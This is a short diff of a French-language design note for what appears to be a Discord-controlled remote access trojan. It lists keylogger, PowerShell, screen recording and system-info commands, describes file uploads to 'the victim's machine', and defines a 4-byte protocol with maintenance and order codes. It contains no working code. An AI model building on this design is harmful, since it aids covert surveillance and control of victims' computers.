@@ -35,7 +35,6 @@ AES-256 Encryption
 
 /keylogger
 
-/info
 
 /powershell 
 
@@ -45,11 +44,24 @@ AES-256 Encryption
 
 ~~/screenrecord~~
 
+/sysinfo
+
 Quand un fichier est upload sur channel discord -> Demande si le bot doit l'upload sur la machine de la victime.
+
+## Communication:
+
+4 bytes
 
 ## Codes
 
-0-99    : Maintenance
-100-199 : Orders
+1-63    : Maintenance
+64-255 : Orders
 
-0: Ask for UUID
+1: Client asks for UUID 
+
+2: Hello from client
+  - UUID
+
+
+  ---
+64: Ask for SysInfo
